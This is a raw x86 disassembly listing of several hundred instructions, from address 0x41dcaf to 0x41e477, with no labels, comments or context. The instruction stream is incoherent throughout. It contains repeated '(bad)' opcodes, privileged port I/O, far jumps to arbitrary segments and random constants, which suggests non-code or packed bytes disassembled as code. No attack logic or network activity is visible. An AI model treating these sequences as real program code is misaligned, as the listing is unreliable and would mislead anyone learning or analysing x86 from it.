  41dcaf:	mov    al,0xb7
  41dcb1:	outs   dx,DWORD PTR ds:[esi]
  41dcb2:	xor    eax,0xff138abd
  41dcb7:	pop    esi
  41dcb8:	xor    cl,BYTE PTR [ebx+ebx*4-0x17]
  41dcbc:	jge    0x41dca9
  41dcbe:	jns    0x41dd05
  41dcc0:	sub    DWORD PTR [ecx],ebx
  41dcc2:	push   es
  41dcc3:	ins    BYTE PTR es:[edi],dx
  41dcc4:	xchg   ebx,eax
  41dcc5:	mov    ebx,0x7a85a857
  41dcca:	ret    0xf93e
  41dccd:	inc    esi
  41dcce:	mov    eax,ds:0xd1da35fe
  41dcd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcd4:	lods   al,BYTE PTR ds:[esi]
  41dcd5:	retf   
  41dcd6:	das    
  41dcd7:	jmp    0x41dd1f
  41dcd9:	jp     0x41dd1f
  41dcdb:	mov    eax,DWORD PTR [ecx]
  41dcdd:	jmp    0x224f:0x613bdff4
  41dce4:	mov    al,ds:0x3e56e15c
  41dce9:	xchg   edi,eax
  41dcea:	mov    esi,0x75124978
  41dcef:	fidiv  WORD PTR [ecx-0x688e21ac]
  41dcf5:	stc    
  41dcf6:	outs   dx,BYTE PTR ds:[esi]
  41dcf7:	or     bl,dl
  41dcf9:	mov    ebp,0x85cc0163
  41dcfe:	ret    
  41dcff:	shl    BYTE PTR [ecx-0x74],0x40
  41dd03:	xchg   edx,eax
  41dd04:	mov    ds:0x351d93bb,eax
  41dd09:	fldlg2 
  41dd0b:	in     eax,0x37
  41dd0d:	mov    dh,BYTE PTR [ebp-0x54711310]
  41dd13:	scas   al,BYTE PTR es:[edi]
  41dd14:	retf   0x56d7
  41dd17:	shl    edx,cl
  41dd19:	rcr    DWORD PTR [eax-0x7bbac41a],1
  41dd1f:	xchg   edi,eax
  41dd20:	push   ebp
  41dd21:	fwait
  41dd22:	add    eax,0x743eb9b6
  41dd27:	neg    cl
  41dd29:	call   0xc072:0xc1975430
  41dd30:	sub    ebx,DWORD PTR [edi]
  41dd32:	xchg   edx,eax
  41dd33:	pusha  
  41dd34:	std    
  41dd35:	sub    al,0x4f
  41dd37:	add    al,0xf8
  41dd39:	cmp    bh,bh
  41dd3b:	xlat   BYTE PTR ds:[ebx]
  41dd3c:	mov    esi,0x0
	...
  41dd49:	add    BYTE PTR [eax],al
  41dd4b:	push   edx
  41dd4c:	add    al,0xa2
  41dd4e:	xor    dh,0xa6
  41dd51:	jb     0x41dd27
  41dd53:	ins    DWORD PTR es:[edi],dx
  41dd54:	xor    dh,BYTE PTR [edx]
  41dd56:	and    eax,0xbfb867f
  41dd5b:	out    dx,eax
  41dd5c:	call   0x0:0xaa0001
  41dd63:	ror    esi,cl
  41dd65:	ror    DWORD PTR [esi+edi*8+0x6c],0x21
  41dd6a:	mov    ds:0x307622dd,al
  41dd6f:	push   0x63
  41dd71:	(bad)  
  41dd72:	xor    al,0xc
  41dd74:	pop    ecx
  41dd75:	sub    al,0xd4
  41dd77:	sti    
  41dd78:	shl    BYTE PTR [esi],cl
  41dd7a:	les    eax,FWORD PTR [eax+0x32]
  41dd7d:	icebp  
  41dd7e:	and    esi,DWORD PTR [ecx+0x6d2023a3]
  41dd84:	adc    eax,esi
  41dd86:	iret   
  41dd87:	and    al,0xf1
  41dd89:	adc    edi,esp
  41dd8b:	arpl   WORD PTR es:[edx],ax
  41dd8e:	stos   BYTE PTR es:[edi],al
  41dd8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd90:	pop    eax
  41dd91:	sbb    DWORD PTR [edx+0x2e4ef65],edi
  41dd97:	jb     0x41dda0
  41dd99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd9a:	adc    eax,0xfc39822f
  41dd9f:	jne    0x41ddb6
  41dda1:	add    BYTE PTR [edx+edx*8+0x73f0f026],bl
  41dda8:	jbe    0x41de0f
  41ddaa:	inc    ecx
  41ddab:	sbb    dh,bh
  41ddad:	sub    edi,edi
  41ddaf:	fnstcw WORD PTR [edi+0x68]
  41ddb2:	cdq    
  41ddb3:	stos   DWORD PTR es:[edi],eax
  41ddb4:	xchg   ecx,eax
  41ddb5:	fld    QWORD PTR [esi]
  41ddb7:	add    BYTE PTR [eax],bh
  41ddb9:	sub    eax,0x29fbdf2d
  41ddbe:	ss ret 
  41ddc0:	icebp  
  41ddc1:	and    al,0xb5
  41ddc3:	push   esi
  41ddc4:	test   BYTE PTR [ebp-0x70],dh
  41ddc7:	cmc    
  41ddc8:	in     al,0xeb
  41ddca:	in     eax,dx
  41ddcb:	xor    esi,DWORD PTR [edx+edi*2+0x13ae34af]
  41ddd2:	inc    ebx
  41ddd3:	adc    esp,DWORD PTR [ebx+0x6b]
  41ddd6:	sbb    cl,dh
  41ddd8:	ins    BYTE PTR es:[edi],dx
  41ddd9:	sub    cl,dh
  41dddb:	mov    ch,0xeb
  41dddd:	jae    0x41ddbd
  41dddf:	add    DWORD PTR [edx+0x32],ebp
  41dde2:	rcr    BYTE PTR [edx+esi*2+0x29599d4d],0x11
  41ddea:	push   ss
  41ddeb:	xchg   esi,eax
  41ddec:	stc    
  41dded:	dec    ecx
  41ddee:	xor    DWORD PTR [eax+0x22d3cbed],0x3e52a63a
  41ddf8:	shl    DWORD PTR [ecx-0x52],1
  41ddfb:	fnsave [edi-0x2077de19]
  41de01:	mov    edi,0x1ce75dcf
  41de06:	xchg   esp,eax
  41de07:	mov    eax,0x7a0ba275
  41de0c:	lahf   
	...
  41de19:	add    BYTE PTR [eax],al
  41de1b:	cmp    BYTE PTR [edx-0x6a],ch
  41de1e:	add    edx,esi
  41de20:	(bad)  
  41de21:	mov    ebp,0xdb4ef67b
  41de26:	out    0x67,eax
  41de28:	and    ch,cl
  41de2a:	(bad)  
  41de2b:	cdq    
  41de2c:	fwait
  41de2d:	add    DWORD PTR [eax],eax
  41de2f:	stos   BYTE PTR es:[edi],al
  41de30:	add    BYTE PTR [eax],al
  41de32:	add    BYTE PTR [edi-0x25],ch
  41de35:	mov    bl,BYTE PTR [ecx]
  41de37:	fsubr  QWORD PTR [esi+0x18484d3c]
  41de3d:	test   DWORD PTR [esi-0x58ab2b2],esi
  41de43:	and    eax,0x825e7740
  41de48:	(bad)  
  41de49:	push   edi
  41de4a:	mov    dl,0x6
  41de4c:	scas   eax,DWORD PTR es:[edi]
  41de4d:	in     eax,dx
  41de4e:	mov    esi,0x97deb95
  41de53:	retf   0x75ce
  41de56:	sbb    bl,BYTE PTR [esi+edi*8-0x5c69c641]
  41de5d:	inc    edi
  41de5e:	test   cl,ah
  41de60:	ss mov ch,0x1e
  41de63:	dec    ebp
  41de64:	mov    dh,BYTE PTR [ecx]
  41de66:	mov    DWORD PTR [ebx-0x3bd74e15],ebx
  41de6c:	hlt    
  41de6d:	lods   al,BYTE PTR ds:[esi]
  41de6e:	leave  
  41de6f:	cmp    al,0x1c
  41de71:	arpl   WORD PTR [ecx-0x477d365a],ax
  41de77:	dec    ebx
  41de78:	or     esi,DWORD PTR [edx]
  41de7a:	sub    esi,DWORD PTR [ecx+0x4a68c146]
  41de80:	inc    eax
  41de81:	xor    al,0x5b
  41de83:	sub    esp,DWORD PTR [ecx]
  41de85:	xchg   esp,eax
  41de86:	aaa    
  41de87:	fs fwait
  41de89:	pop    ds
  41de8a:	push   ss
  41de8b:	ret    0xd3a3
  41de8e:	xchg   ebp,eax
  41de8f:	or     al,al
  41de91:	adc    BYTE PTR [ecx-0x3804da59],ah
  41de97:	nop
  41de98:	pop    edi
  41de99:	or     eax,0x32cd22c
  41de9e:	inc    edx
  41de9f:	jnp    0x41de38
  41dea1:	inc    edi
  41dea2:	pop    ecx
  41dea3:	cmc    
  41dea4:	pop    eax
  41dea5:	jg     0x41de48
  41dea7:	add    BYTE PTR [esi],ah
  41dea9:	mov    ebp,0x2aa26b81
  41deae:	mov    ah,0x21
  41deb0:	mov    WORD PTR ds:0xae35eaa0,gs
  41deb6:	fmul   QWORD PTR [edi+ebx*8-0x291c2237]
  41debd:	dec    eax
  41debe:	cli    
  41debf:	push   edx
  41dec0:	out    dx,al
  41dec1:	into   
  41dec2:	or     al,0x95
  41dec4:	lahf   
  41dec5:	test   eax,0xe6f6e52c
  41deca:	mov    ebp,0x4e675ed2
  41decf:	dec    ebx
  41ded0:	stc    
  41ded1:	xchg   esp,eax
  41ded2:	xchg   DWORD PTR [esi+0x44],esp
  41ded5:	push   cs
  41ded6:	das    
  41ded7:	xor    DWORD PTR [ebx+edi*4+0x1c],edi
  41dedb:	push   ebx
  41dedc:	push   es
	...
  41dee9:	add    BYTE PTR [eax],al
  41deeb:	jmp    0x7a7259a9
  41def0:	repz jmp 0x41deec
  41def3:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41def7:	jmp    0x41df17
  41def9:	push   ebp
  41defa:	adc    eax,0x19c43
  41deff:	stos   BYTE PTR es:[edi],al
  41df00:	add    BYTE PTR [eax],al
  41df02:	add    BYTE PTR [esi+0x4e49eb72],cl
  41df08:	mov    bh,0xc8
  41df0a:	pop    ds
  41df0b:	ins    DWORD PTR es:[edi],dx
  41df0c:	loope  0x41debe
  41df0e:	data16 xchg BYTE PTR [edx],ah
  41df11:	inc    eax
  41df12:	sub    eax,0xbf633f7f
  41df17:	rcr    edi,0x22
  41df1a:	cld    
  41df1b:	push   edx
  41df1c:	adc    dh,BYTE PTR [edx]
  41df1e:	sub    ah,bh
  41df20:	mov    cl,0x96
  41df22:	dec    ebp
  41df23:	fwait
  41df24:	mov    esp,0xa1c5fa61
  41df29:	sbb    esi,ebx
  41df2b:	jns    0x41df45
  41df2d:	popa   
  41df2e:	cmp    BYTE PTR [ebx+0x34],cl
  41df31:	or     cl,BYTE PTR [edi-0xf]
  41df34:	cmc    
  41df35:	data16 scas al,BYTE PTR es:[edi]
  41df37:	aam    0x1f
  41df39:	js     0x41df8b
  41df3b:	pop    DWORD PTR [ebx+0x59]
  41df3e:	and    DWORD PTR [edi+eax*4],eax
  41df41:	xchg   ecx,eax
  41df42:	repnz and cl,0x29
  41df46:	mov    DWORD PTR [esi-0x7e],eax
  41df49:	aam    0x78
  41df4b:	repnz dec edx
  41df4d:	push   0xdf0035a1
  41df52:	adc    DWORD PTR ds:0xfddae8e9,edi
  41df58:	xchg   edi,eax
  41df59:	(bad)  
  41df5a:	out    0xa1,al
  41df5c:	adc    DWORD PTR [esi+0x43],ecx
  41df5f:	jb     0x41dee3
  41df61:	aam    0x49
  41df63:	test   DWORD PTR [edi],ebx
  41df65:	pop    esp
  41df66:	aas    
  41df67:	dec    ebx
  41df68:	test   DWORD PTR ds:0x6c664ca0,0x7d1324a0
  41df72:	mov    WORD PTR [ecx],ds
  41df74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df75:	add    BYTE PTR [ebp-0x1c],dh
  41df78:	pop    edi
  41df79:	out    0xd6,eax
  41df7b:	cdq    
  41df7c:	test   al,0xf9
  41df7e:	pop    esp
  41df7f:	mov    DWORD PTR [ebx-0x5fd158f8],ecx
  41df85:	or     eax,0xcdbe235b
  41df8a:	jae    0x41dfcb
  41df8c:	xchg   ebp,eax
  41df8d:	or     ecx,DWORD PTR ds:0x28d87083
  41df93:	iret   
  41df94:	nop
  41df95:	je     0x41dfad
  41df97:	outs   dx,BYTE PTR ds:[esi]
  41df98:	scas   eax,DWORD PTR es:[edi]
  41df99:	push   ecx
  41df9a:	cmp    al,BYTE PTR [esi+eax*4-0x7458c8e9]
  41dfa1:	shr    DWORD PTR [ebx],0x72
  41dfa4:	test   eax,0xd9d5b103
  41dfa9:	jnp    0x41dfad
  41dfab:	pop    ss
  41dfac:	aad    0x0
	...
  41dfba:	add    BYTE PTR [ebx+0x41],bl
  41dfbd:	pop    ebx
  41dfbe:	iret   
  41dfbf:	pop    ebx
  41dfc0:	(bad)  
  41dfc2:	aad    0xf
  41dfc4:	ss dec esp
  41dfc6:	dec    esi
  41dfc7:	sub    edi,edx
  41dfc9:	pop    eax
  41dfca:	call   0x437cbc
  41dfcf:	stos   BYTE PTR es:[edi],al
  41dfd0:	add    BYTE PTR [eax],al
  41dfd2:	add    BYTE PTR [ecx+0x3b2caa55],bh
  41dfd8:	lods   eax,DWORD PTR ss:[esi]
  41dfda:	mov    eax,0x276b6e4e
  41dfdf:	(bad)  
  41dfe0:	sbb    eax,0xdbafb6d6
  41dfe5:	test   eax,0x9e3c4ee0
  41dfea:	cmp    ch,BYTE PTR [edi+ebp*1+0x67c9cd70]
  41dff1:	bound  eax,QWORD PTR [eax+0xf42638c]
  41dff7:	ds xchg edx,eax
  41dff9:	sub    ch,BYTE PTR [eax]
  41dffb:	(bad)  
  41dffc:	fistp  QWORD PTR [ebp+0x65]
  41dfff:	mov    ds:0xafe1ba1,al
  41e004:	leave  
  41e005:	(bad)  
  41e006:	call   0x45a87184
  41e00b:	jns    0x41e005
  41e00d:	add    DWORD PTR [esi-0x1e],ebp
  41e010:	ins    DWORD PTR es:[edi],dx
  41e011:	dec    eax
  41e012:	pop    edx
  41e013:	ret    
  41e014:	or     BYTE PTR [ecx-0x1678f416],bh
  41e01a:	call   0x2f7096c9
  41e01f:	mov    eax,ds:0xf5d0c75e
  41e024:	mov    ah,0xa3
  41e026:	mov    ecx,0xd1768e4e
  41e02b:	xor    eax,0x1fbecccd
  41e030:	sbb    eax,0xc0e0b11a
  41e035:	adc    DWORD PTR [ecx],0x72
  41e038:	or     esi,DWORD PTR [ebp+0x7cd10ad9]
  41e03e:	push   ds
  41e03f:	sbb    al,0x4f
  41e041:	idiv   DWORD PTR [edi]
  41e043:	mov    al,ds:0xc1c798e4
  41e048:	adc    ebx,edx
  41e04a:	xor    dl,BYTE PTR [ebx-0x75ebb2fc]
  41e050:	cmp    DWORD PTR [ebp-0x2eecd919],esp
  41e056:	js     0x41e0a4
  41e058:	iret   
  41e059:	nop
  41e05a:	mov    ebp,0xbaaf07fe
  41e05f:	in     eax,dx
  41e060:	das    
  41e061:	mov    al,ds:0x94d02d29
  41e066:	lods   eax,DWORD PTR ds:[esi]
  41e067:	into   
  41e068:	bound  esi,QWORD PTR [eax+0x2fc8622]
  41e06e:	or     eax,0x5731227b
  41e073:	ret    0x5bca
  41e076:	push   es
  41e077:	mov    ch,0xad
  41e079:	cmp    eax,0xddd2b2
	...
  41e08a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e090:	cld    
  41e091:	(bad)  [edi-0x65be08a1]
  41e097:	ja     0x41e0f3
  41e099:	sub    DWORD PTR [ecx+0x19d97],ecx
  41e09f:	stos   BYTE PTR es:[edi],al
  41e0a0:	add    BYTE PTR [eax],al
  41e0a2:	add    al,bl
  41e0a4:	mov    ah,0x37
  41e0a6:	sahf   
  41e0a7:	jno    0x41e07e
  41e0a9:	mov    dl,0xbe
  41e0ab:	nop
  41e0ac:	test   DWORD PTR [ebp+0x655e08b7],edi
  41e0b2:	jbe    0x41e089
  41e0b4:	push   esp
  41e0b5:	dec    ebx
  41e0b6:	add    al,0x89
  41e0b8:	jge    0x41e06c
  41e0ba:	lock mov eax,0x31189a54
  41e0c0:	mov    ds:0x65b74abe,al
  41e0c5:	mov    ebp,0x7776b147
  41e0ca:	sbb    ecx,DWORD PTR [ebx+esi*8+0x96fee54]
  41e0d1:	sahf   
  41e0d2:	xchg   esp,eax
  41e0d3:	not    DWORD PTR [ebp-0x3a]
  41e0d6:	add    ch,BYTE PTR [ecx-0x731417a6]
  41e0dc:	sub    BYTE PTR [ecx-0x1f],0x49
  41e0e0:	push   ecx
  41e0e1:	push   esp
  41e0e2:	aas    
  41e0e3:	pop    ecx
  41e0e4:	aad    0xd3
  41e0e6:	mov    bl,BYTE PTR [eax-0xb]
  41e0e9:	pop    eax
  41e0ea:	stos   DWORD PTR es:[edi],eax
  41e0eb:	out    0x28,eax
  41e0ed:	loop   0x41e0dc
  41e0ef:	add    al,0x1b
  41e0f1:	int    0xcd
  41e0f3:	stos   DWORD PTR es:[edi],eax
  41e0f4:	int3   
  41e0f5:	jb     0x41e170
  41e0f7:	out    dx,eax
  41e0f8:	adc    dl,dl
  41e0fa:	scas   eax,DWORD PTR es:[edi]
  41e0fb:	call   DWORD PTR ds:0x3365ad0
  41e101:	mov    dh,BYTE PTR [edx+0x28]
  41e104:	iret   
  41e105:	pop    esi
  41e106:	pop    edi
  41e107:	shr    DWORD PTR [eax-0x61afcc2c],cl
  41e10d:	sub    al,BYTE PTR [eax+eax*4-0x72]
  41e111:	xchg   edx,edi
  41e113:	dec    edi
  41e114:	cmp    bh,bh
  41e116:	jecxz  0x41e11e
  41e118:	mov    eax,ds:0x817a7dd2
  41e11d:	add    BYTE PTR [esi-0x3b],ch
  41e120:	dec    eax
  41e121:	fcomp  QWORD PTR [ebx]
  41e123:	jmp    0x41e16e
  41e125:	sub    eax,0xd0154119
  41e12a:	aad    0x94
  41e12c:	push   cs
  41e12d:	inc    edi
  41e12e:	pop    ecx
  41e12f:	fcmovnbe st,st(3)
  41e131:	adc    al,0x48
  41e133:	ror    ebx,cl
  41e135:	arpl   WORD PTR [ebx],ax
  41e137:	jecxz  0x41e15b
  41e139:	mov    ds:0x31579802,eax
  41e13e:	cld    
  41e13f:	std    
  41e140:	repnz fstp DWORD PTR [edx-0x49]
  41e144:	test   eax,0x46e1ba46
  41e149:	sbb    cl,BYTE PTR [ebx+0xe3bb]
	...
  41e15b:	outs   dx,BYTE PTR ds:[esi]
  41e15c:	jae    0x41e14e
  41e15e:	retf   0xcbfd
  41e161:	jle    0x41e15a
  41e163:	repz xor eax,0x61068ce9
  41e169:	pop    edx
  41e16a:	sub    eax,DWORD PTR [ecx-0x62]
  41e16d:	add    DWORD PTR [eax],eax
  41e16f:	stos   BYTE PTR es:[edi],al
  41e170:	add    BYTE PTR [eax],al
  41e172:	add    BYTE PTR [esi-0x68],ah
  41e175:	mov    eax,0x7cedd680
  41e17a:	cld    
  41e17b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e17c:	sti    
  41e17d:	pop    edi
  41e17e:	mov    edx,0x2b84a0b1
  41e183:	mov    BYTE PTR [edi],ch
  41e185:	(bad)  
  41e186:	fidivr DWORD PTR [eax+edi*2-0x494040e1]
  41e18d:	jg     0x41e1ec
  41e18f:	ins    DWORD PTR es:[edi],dx
  41e190:	out    dx,eax
  41e191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e192:	fcmovnbe st,st(1)
  41e194:	(bad)  
  41e195:	fcom   DWORD PTR [eiz*1-0x5d8fd69f]
  41e19c:	daa    
  41e19d:	sbb    DWORD PTR [esi],edx
  41e19f:	test   BYTE PTR [edx+0x6f],ch
  41e1a2:	fimul  DWORD PTR ds:0x4bdfabdd
  41e1a8:	sub    eax,0x505b2c7f
  41e1ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1ae:	or     DWORD PTR [esi],esp
  41e1b0:	push   esi
  41e1b1:	lods   al,BYTE PTR ds:[esi]
  41e1b2:	cmp    edx,DWORD PTR [edi+0x7f7e2af9]
  41e1b8:	xchg   ecx,eax
  41e1b9:	and    al,BYTE PTR [edi]
  41e1bb:	mov    al,0x9e
  41e1bd:	and    eax,0x542e691c
  41e1c2:	stos   DWORD PTR es:[edi],eax
  41e1c3:	jo     0x41e216
  41e1c5:	mov    eax,0xf5c431fd
  41e1ca:	ins    BYTE PTR es:[edi],dx
  41e1cb:	leave  
  41e1cc:	xchg   esi,eax
  41e1cd:	(bad)  
  41e1ce:	pop    eax
  41e1cf:	push   esi
  41e1d0:	(bad)  
  41e1d1:	adc    edi,DWORD PTR [eax+0x5c]
  41e1d4:	hlt    
  41e1d5:	in     eax,dx
  41e1d6:	mov    esp,0x732691ac
  41e1db:	(bad)  [esi+0x593934a1]
  41e1e1:	(bad)  
  41e1e2:	pop    ss
  41e1e3:	data16 jo 0x41e1d6
  41e1e6:	inc    esi
  41e1e7:	dec    ebp
  41e1e8:	nop
  41e1e9:	hlt    
  41e1ea:	lods   eax,DWORD PTR ds:[esi]
  41e1eb:	rol    DWORD PTR [esi-0x78395bed],1
  41e1f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f2:	jmp    ecx
  41e1f4:	loope  0x41e195
  41e1f6:	mov    ecx,edx
  41e1f8:	leave  
  41e1f9:	sbb    BYTE PTR [edi-0x6a6a7751],0x25
  41e200:	push   eax
  41e201:	pop    eax
  41e202:	dec    eax
  41e203:	fbld   TBYTE PTR [ecx*4+0x7371f055]
  41e20a:	push   ebx
  41e20b:	mov    ah,0xff
  41e20d:	out    dx,eax
  41e20e:	pop    esi
  41e20f:	sub    BYTE PTR [ecx-0xe72157a],bl
  41e215:	push   eax
  41e216:	mov    eax,0xb218217e
  41e21b:	mov    esp,0xf7
	...
  41e228:	add    BYTE PTR [eax],al
  41e22a:	add    ch,dh
  41e22c:	adc    al,0xae
  41e22e:	adc    ebp,edi
  41e230:	mov    ebx,0x84e6f6fd
  41e235:	lds    ebp,FWORD PTR [edx+0x4d458c8e]
  41e23b:	jmp    0x41e1db
  41e23d:	add    DWORD PTR [eax],eax
  41e23f:	stos   BYTE PTR es:[edi],al
  41e240:	add    BYTE PTR [eax],al
  41e242:	add    BYTE PTR [ecx+eax*2-0x5d7c582a],dl
  41e249:	push   0xd84c657a
  41e24e:	inc    ebx
  41e24f:	push   ecx
  41e250:	pop    eax
  41e251:	pop    es
  41e252:	test   eax,0xa846d7a8
  41e257:	sbb    al,0x49
  41e259:	cmp    DWORD PTR [eax+0x3fc16c55],0x4e
  41e260:	xchg   esi,eax
  41e261:	sub    al,0x4c
  41e263:	mov    ebp,DWORD PTR [edi]
  41e265:	xor    eax,0xe44d712
  41e26a:	adc    BYTE PTR [edx-0x4e],bh
  41e26d:	fwait
  41e26e:	or     ebp,edx
  41e270:	push   ss
  41e271:	cdq    
  41e272:	retf   
  41e273:	fcom   QWORD PTR [ebx+0x65]
  41e276:	lea    edi,[ebp+0x5e]
  41e279:	fldenv ds:0xae7620fb
  41e27f:	mov    ah,0xd8
  41e281:	jl     0x41e2ab
  41e283:	loope  0x41e2f0
  41e285:	int    0x24
  41e287:	test   eax,0x7a5e7dc5
  41e28c:	pusha  
  41e28d:	in     al,0x11
  41e28f:	pop    es
  41e290:	fsubr  DWORD PTR [ebx]
  41e292:	ins    DWORD PTR es:[edi],dx
  41e293:	arpl   WORD PTR ds:0x6572ae73,cx
  41e299:	sub    BYTE PTR ds:0x1a74f00e,ch
  41e29f:	xor    DWORD PTR ds:0x2f2556d,ebx
  41e2a5:	cwde   
  41e2a6:	gs adc al,0x8c
  41e2a9:	or     eax,0xd475456d
  41e2ae:	xlat   BYTE PTR ds:[ebx]
  41e2af:	xchg   edx,eax
  41e2b0:	xor    bl,bh
  41e2b2:	cwde   
  41e2b3:	xchg   ecx,eax
  41e2b4:	or     esp,eax
  41e2b6:	xchg   BYTE PTR [edi+0x60bfa121],ah
  41e2bc:	iret   
  41e2bd:	mov    edx,0xc6786585
  41e2c2:	in     al,dx
  41e2c3:	add    al,0x81
  41e2c5:	sub    eax,0x4da459a1
  41e2ca:	test   BYTE PTR [ecx],al
  41e2cc:	retf   0x5d47
  41e2cf:	pop    edi
  41e2d0:	gs mov cl,0xa8
  41e2d3:	call   0xdd3d0f05
  41e2d8:	leave  
  41e2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2da:	sub    BYTE PTR [edx],dh
  41e2dc:	outs   dx,BYTE PTR ds:[esi]
  41e2dd:	add    DWORD PTR [esi+ecx*2-0x76b084da],edx
  41e2e4:	pushf  
  41e2e5:	out    dx,eax
  41e2e6:	aas    
  41e2e7:	enter  0xa251,0x30
  41e2eb:	pop    es
  41e2ec:	jbe    0x41e2ee
	...
  41e2fa:	add    BYTE PTR [ebx],bh
  41e2fc:	mov    cl,0x57
  41e2fe:	lock fcomip st,st(6)
  41e301:	mov    edi,0xbb1c16fb
  41e306:	rol    BYTE PTR [esi-0x6a8dd206],0x9f
  41e30d:	add    DWORD PTR [eax],eax
  41e30f:	stos   BYTE PTR es:[edi],al
  41e310:	add    BYTE PTR [eax],al
  41e312:	add    bh,dh
  41e314:	ins    DWORD PTR es:[edi],dx
  41e315:	(bad)
  41e318:	inc    esp
  41e319:	stos   DWORD PTR es:[edi],eax
  41e31a:	int    0x45
  41e31c:	les    ecx,FWORD PTR [ecx-0x5e]
  41e31f:	ret    0x8acd
  41e322:	push   eax
  41e323:	push   cs
  41e324:	sbb    al,0x3e
  41e326:	sbb    dh,dl
  41e328:	add    dl,dl
  41e32a:	push   esp
  41e32b:	fwait
  41e32c:	xor    DWORD PTR [edx+0x26],esi
  41e32f:	mov    eax,ds:0x18fc845
  41e334:	leave  
  41e335:	mov    eax,ds:0x3c5b1016
  41e33a:	pop    esi
  41e33b:	sub    DWORD PTR [eax],edx
  41e33d:	stc    
  41e33e:	dec    edi
  41e33f:	int3   
  41e340:	shr    BYTE PTR [eax],1
  41e342:	inc    edx
  41e343:	and    al,0x77
  41e345:	push   0x6c
  41e347:	int    0xf1
  41e349:	shl    DWORD PTR [ecx],cl
  41e34b:	ss pop ds
  41e34d:	gs aas 
  41e34f:	sbb    ebx,ebx
  41e351:	sbb    cl,BYTE PTR [eax-0x2979b90c]
  41e357:	cmp    DWORD PTR [esi+ebp*2+0x34],esi
  41e35b:	xchg   esi,eax
  41e35c:	inc    esp
  41e35d:	jp     0x41e3db
  41e35f:	popa   
  41e360:	or     al,0x42
  41e362:	or     edi,DWORD PTR [edi-0xb1edb46]
  41e368:	aad    0x73
  41e36a:	push   ebp
  41e36b:	jae    0x41e301
  41e36d:	dec    DWORD PTR [edi+0x4b185fb3]
  41e373:	outs   dx,BYTE PTR ds:[esi]
  41e374:	xchg   esi,eax
  41e375:	ret    
  41e376:	dec    edi
  41e377:	lods   al,BYTE PTR ds:[esi]
  41e378:	push   ebp
  41e379:	mov    ah,0xe1
  41e37b:	mov    db5,esp
  41e37e:	jne    0x41e392
  41e380:	clc    
  41e381:	push   edx
  41e382:	xor    dh,dh
  41e384:	add    dh,BYTE PTR [ecx-0x21dbd43b]
  41e38a:	cwde   
  41e38b:	push   es
  41e38c:	push   ds
  41e38d:	xor    BYTE PTR [ebx-0x265acfa8],0x33
  41e394:	xchg   edi,eax
  41e395:	in     eax,dx
  41e396:	aas    
  41e397:	sbb    DWORD PTR [ebp-0x77],esp
  41e39a:	inc    ecx
  41e39b:	repnz mov ebx,0x728687da
  41e3a1:	jnp    0x41e37d
  41e3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3a4:	int    0x70
  41e3a6:	mov    BYTE PTR [ebx-0x1b6a52f1],bl
  41e3ac:	add    dh,ch
  41e3ae:	bound  edx,QWORD PTR [edi-0x1217af29]
  41e3b4:	js     0x41e41b
  41e3b6:	sbb    BYTE PTR [edi+0x5bb36d87],0x1e
	...
  41e3c9:	add    BYTE PTR [eax],al
  41e3cb:	aam    0xf
  41e3cd:	push   ecx
  41e3ce:	lock (bad) 
  41e3d1:	cmc    
  41e3d2:	das    
  41e3d3:	sbb    BYTE PTR [eax],cl
  41e3d5:	xchg   ebx,eax
  41e3d6:	iret   
  41e3d7:	mov    ds:0x3fb1a151,eax
  41e3dc:	mov    al,ds:0xaa0001
  41e3e1:	add    BYTE PTR [eax],al
  41e3e3:	mov    bh,0xe6
  41e3e5:	push   eax
  41e3e6:	test   DWORD PTR [eiz*4+0x4732bf27],0xd964139d
  41e3f1:	pushf  
  41e3f2:	adc    ebx,ebx
  41e3f4:	les    edx,FWORD PTR [ebx+0x48542847]
  41e3fa:	and    eax,0x701150f3
  41e3ff:	ins    DWORD PTR es:[edi],dx
  41e400:	ins    DWORD PTR es:[edi],dx
  41e401:	xor    dl,BYTE PTR [esi+0x21]
  41e404:	repz dec ecx
  41e406:	lods   al,BYTE PTR ds:[esi]
  41e407:	xchg   edi,eax
  41e408:	stos   BYTE PTR es:[edi],al
  41e409:	mov    ds:0x142ff085,eax
  41e40e:	jle    0x41e41c
  41e410:	xor    BYTE PTR [esi-0x1bb81b51],ch
  41e416:	cmp    al,0x96
  41e418:	ret    0xe637
  41e41b:	outs   dx,BYTE PTR ds:[esi]
  41e41c:	xchg   edx,eax
  41e41d:	xchg   esi,eax
  41e41e:	ins    DWORD PTR es:[edi],dx
  41e41f:	ss push edi
  41e421:	aas    
  41e422:	data16 jle 0x41e481
  41e425:	fld    TBYTE PTR [ecx+0x42]
  41e428:	dec    edx
  41e429:	inc    edx
  41e42a:	js     0x41e450
  41e42c:	mov    dh,0x33
  41e42e:	out    dx,eax
  41e42f:	daa    
  41e430:	clc    
  41e431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e432:	iret   
  41e433:	ins    BYTE PTR es:[edi],dx
  41e434:	call   0xc25c:0xe3bbc5b4
  41e43b:	dec    ecx
  41e43c:	shr    edi,cl
  41e43e:	sbb    DWORD PTR [ebp+0xc],0xefa51bf3
  41e445:	gs adc al,BYTE PTR ds:[esi+esi*4+0x50]
  41e44b:	mov    WORD PTR [edx-0x2f],ds
  41e44e:	mov    bh,0xf
  41e450:	mov    eax,0x37524510
  41e455:	push   0x8d21e3f2
  41e45a:	sbb    ah,BYTE PTR [eax]
  41e45c:	test   al,0xda
  41e45e:	in     eax,0xb4
  41e460:	out    0x2e,eax
  41e462:	hlt    
  41e463:	adc    bl,0xf0
  41e466:	les    esi,FWORD PTR [ecx-0x65]
  41e469:	inc    ebx
  41e46a:	pop    edi
  41e46b:	dec    edx
  41e46c:	lock dec edx
  41e46e:	or     cl,bh
  41e470:	jns    0x41e45e
  41e472:	and    eax,0xfc10c009
  41e477:	dec    ebx
